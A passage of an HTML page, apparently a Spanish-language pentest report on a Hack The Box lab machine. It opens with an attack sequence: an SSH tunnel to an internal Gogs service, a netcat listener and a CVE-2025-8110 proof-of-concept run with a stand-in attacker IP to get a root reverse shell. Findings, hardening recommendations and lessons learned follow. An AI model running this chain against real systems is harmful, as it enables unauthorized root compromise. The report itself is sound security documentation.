+<span class="t-blue">ssh</span> -N -L 13001:localhost:3001 ben@&lt;TARGET_IP&gt;
+
+<span class="t-muted"># 2. Listener en el atacante</span>
+<span class="t-orange">nc</span> -lvnp 4444
+
+<span class="t-muted"># 3. Ejecución del PoC CVE-2025-8110</span>
+<span class="t-blue">python3</span> cve-2025-8110.py \
+  -u <span class="t-yellow">http://127.0.0.1:13001</span> \
+  -lh <span class="t-yellow">&lt;ATTACKER_IP&gt;</span> \
+  -lp <span class="t-yellow">4444</span> \
+  -U <span class="t-green">hacker</span> \
+  -P <span class="t-green">hacker123</span>
+
+<span class="t-muted"># 4. Post-explotación</span>
+<span class="t-red">id</span>            <span class="t-muted"># → uid=0(root)</span>
+<span class="t-red">cat</span> /root/root.txt</pre>
+      </div>
+    </div>
+
+    <!-- ── SECTION 5: HALLAZGOS ── -->
+    <div class="section reveal">
+      <div class="sec-header">
+        <div class="sec-num">05</div>
+        <div class="sec-info">
+          <div class="sec-tag">NIST Phase 4 — Erradicación / Hallazgos</div>
+          <div class="sec-title">Hallazgos de Seguridad</div>
+          <div class="sec-desc">Vulnerabilidades identificadas ordenadas por severidad</div>
+        </div>
+      </div>
+
+      <div class="findings-grid">
+        <div class="finding-card crit">
+          <div class="finding-sev crit">🔴 Crítico</div>
+          <div class="finding-title">Gogs RCE — CVE-2025-8110</div>
+          <div class="finding-desc">Ejecución remota de código como root mediante symlink injection en API PutContents y sshCommand malicioso en .git/config.</div>
+        </div>
+        <div class="finding-card crit">
+          <div class="finding-sev crit">🔴 Crítico</div>
+          <div class="finding-title">Gogs corriendo como root</div>
+          <div class="finding-desc">El proceso Gogs se ejecuta con UID 0, amplificando cualquier vulnerabilidad a un compromiso total inmediato sin necesidad de escalada adicional.</div>
+        </div>
+        <div class="finding-card high">
+          <div class="finding-sev high">🟠 Alto</div>
+          <div class="finding-title">Credenciales SSH de bajo privilegio expuestas</div>
+          <div class="finding-desc">El usuario ben cuenta con credenciales débiles o conocidas que permiten el acceso inicial al sistema, facilitando el pivoting a servicios internos.</div>
+        </div>
+        <div class="finding-card high">
+          <div class="finding-sev high">🟠 Alto</div>
+          <div class="finding-title">Servicios internos sin autenticación fuerte</div>
+          <div class="finding-desc">Flowise y Gogs accesibles en loopback sin segmentación adicional. Un único foothold es suficiente para alcanzar ambos servicios privilegiados.</div>
+        </div>
+        <div class="finding-card med">
+          <div class="finding-sev med">🟡 Medio</div>
+          <div class="finding-title">Ausencia de monitoreo de túneles SSH</div>
+          <div class="finding-desc">El port-forwarding SSH hacia puertos internos no fue detectado ni bloqueado, permitiendo al atacante alcanzar Gogs desde el exterior de forma transparente.</div>
+        </div>
+        <div class="finding-card med">
+          <div class="finding-sev med">🟡 Medio</div>
+          <div class="finding-title">Flowise sin control de acceso robusto</div>
+          <div class="finding-desc">El endpoint customMCP solo rechazó el ataque por un token inválido. La superficie de ataque del servicio existe y podría ser explotada con credenciales correctas.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── SECTION 6: RECUPERACIÓN ── -->
+    <div class="section reveal">
+      <div class="sec-header">
+        <div class="sec-num">06</div>
+        <div class="sec-info">
+          <div class="sec-tag">NIST Phase 5 — Recuperación</div>
+          <div class="sec-title">Recomendaciones</div>
+          <div class="sec-desc">Plan de acción priorizado para mitigación y hardening</div>
+        </div>
+      </div>
+
+      <div class="rec-list">
+        <div class="rec-item">
+          <div class="rec-prio p1">P1</div>
+          <div class="rec-body">
+            <div class="rec-title">Parchear Gogs a versión no vulnerable</div>
+            <div class="rec-desc">Aplicar el parche oficial que corrige CVE-2025-8110. Validar con prueba de concepto post-parche. <em>Tiempo estimado: inmediato.</em></div>
+          </div>
+        </div>
+        <div class="rec-item">
+          <div class="rec-prio p1">P1</div>
+          <div class="rec-body">
+            <div class="rec-title">Ejecutar Gogs y Flowise con usuarios dedicados sin privilegios</div>
+            <div class="rec-desc">Crear usuarios del sistema <code>gogs</code> y <code>flowise</code> con UID no root. Usar systemd con <code>User=</code> y <code>NoNewPrivileges=yes</code>. Esto limita el blast radius de cualquier RCE a root.</div>
+          </div>
+        </div>
+        <div class="rec-item">
+          <div class="rec-prio p1">P1</div>
+          <div class="rec-body">
+            <div class="rec-title">Rotar credenciales SSH del usuario ben</div>
+            <div class="rec-desc">Invalidar contraseña actual, requerir autenticación por clave pública, deshabilitar autenticación por contraseña en <code>/etc/ssh/sshd_config</code>.</div>
+          </div>
+        </div>
+        <div class="rec-item">
+          <div class="rec-prio p2">P2</div>
+          <div class="rec-body">
+            <div class="rec-title">Restringir port-forwarding SSH</div>
+            <div class="rec-desc">Agregar <code>AllowTcpForwarding no</code> y <code>PermitTunnel no</code> en sshd_config para el usuario ben. Usar configuración por usuario con directiva Match.</div>
+          </div>
+        </div>
+        <div class="rec-item">
+          <div class="rec-prio p2">P2</div>
+          <div class="rec-body">
+            <div class="rec-title">Segmentar servicios internos con firewall local</div>
+            <div class="rec-desc">Usar <code>iptables</code> o <code>nftables</code> para restringir qué usuarios del sistema pueden conectarse a los puertos 3000 y 3001. Considerar network namespaces.</div>
+          </div>
+        </div>
+        <div class="rec-item">
+          <div class="rec-prio p2">P2</div>
+          <div class="rec-body">
+            <div class="rec-title">Implementar autenticación robusta en Flowise</div>
+            <div class="rec-desc">Rotar API keys y Bearer tokens de Flowise. Implementar rate limiting y logging de intentos de acceso al endpoint customMCP.</div>
+          </div>
+        </div>
+        <div class="rec-item">
+          <div class="rec-prio p3">P3</div>
+          <div class="rec-body">
+            <div class="rec-title">Implementar monitoreo y alertas (SIEM)</div>
+            <div class="rec-desc">Configurar alertas para: conexiones SSH salientes desde el servidor, port-forwarding activo, procesos shell lanzados por servicios web, y comandos <code>id</code> / <code>whoami</code> ejecutados.</div>
+          </div>
+        </div>
+        <div class="rec-item">
+          <div class="rec-prio p3">P3</div>
+          <div class="rec-body">
+            <div class="rec-title">Auditoría periódica de CVEs en servicios autoalojados</div>
+            <div class="rec-desc">Integrar herramientas como <code>trivy</code>, <code>grype</code> o <code>osv-scanner</code> en el pipeline de CI/CD para detectar vulnerabilidades conocidas en servicios desplegados.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── SECTION 7: LECCIONES APRENDIDAS ── -->
+    <div class="section reveal">
+      <div class="sec-header">
+        <div class="sec-num">07</div>
+        <div class="sec-info">
+          <div class="sec-tag">NIST Phase 6 — Lecciones Aprendidas</div>
+          <div class="sec-title">Conclusiones</div>
+          <div class="sec-desc">Síntesis y contexto del ejercicio de seguridad</div>
+        </div>
+      </div>
+
+      <p>El ejercicio demostró que una <strong>cadena de ataque corta y efectiva</strong> puede llevar al compromiso total de un sistema cuando se combinan: credenciales débiles en un servicio perimetral, servicios internos privilegiados no parcheados, y ausencia de controles de red internos.</p>
+
+      <div class="callout callout-orange">
+        <strong>Insight principal:</strong> El vector más peligroso no fue la vulnerabilidad en sí misma, sino el hecho de que el proceso Gogs corría como <code>root</code>. Sin ese error de configuración, el impacto de CVE-2025-8110 se hubiera limitado al usuario del servicio.
+      </div>
+
+      <p>La evaluación también validó la <strong>metodología NIST SP 800-61 Rev.2</strong> como marco estructurador: la fase de detección y análisis permitió identificar los servicios internos de forma ordenada, mientras que la fase de erradicación guió el análisis técnico del CVE con suficiente profundidad para documentar el mecanismo de explotación de forma reproducible.</p>
+
+      <div class="callout callout-green">
+        <strong>Fortaleza identificada:</strong> Flowise resistió el ataque inicial por ausencia de token válido. Un control de acceso funcional, aunque básico, fue suficiente para bloquear un vector de ataque y forzar al atacante hacia un path alternativo.
+      </div>
+
+      <div class="sig-grid">
+        <div class="sig-cell">
+          <div class="sig-lbl">Analista</div>
+          <div class="sig-name">Bryan Reyes Campos</div>
+          <div class="sig-role">Pentester — HTB Lab</div>
+        </div>
+        <div class="sig-cell">
+          <div class="sig-lbl">Marco aplicado</div>
+          <div class="sig-name">NIST SP 800-61 Rev.2</div>
+          <div class="sig-role">Computer Security Incident Handling Guide</div>
+        </div>
+        <div class="sig-cell">
+          <div class="sig-lbl">Severidad final</div>
+          <div class="sig-name" style="color:var(--red)">CRÍTICA</div>
+          <div class="sig-role">Root comprometido · CVE-2025-8110</div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /page -->
+
+  <div class="footer">
+    <span>CONFIDENCIAL — Uso interno · Análisis de Seguridad Ofensiva · HTB Silentium</span>
+    <span>INC-2025-HTB-SILENTIUM · Bryan Reyes Campos</span>
+  </div>
+
+</div><!-- /app -->
+
+<script>
+const { createApp } = Vue;
+createApp({
+  mounted() {
+    const io = new IntersectionObserver((entries) => {
+      entries.forEach((e, i) => {
+        if (e.isIntersecting) {
+          setTimeout(() => e.target.classList.add('in'), i * 70);
+          io.unobserve(e.target);
+        }
+      });
+    }, { threshold: 0.06 });
+    document.querySelectorAll('.reveal').forEach(el => io.observe(el));
+  }
+}).mount('#app');
+</script>
+</body>
+</html>
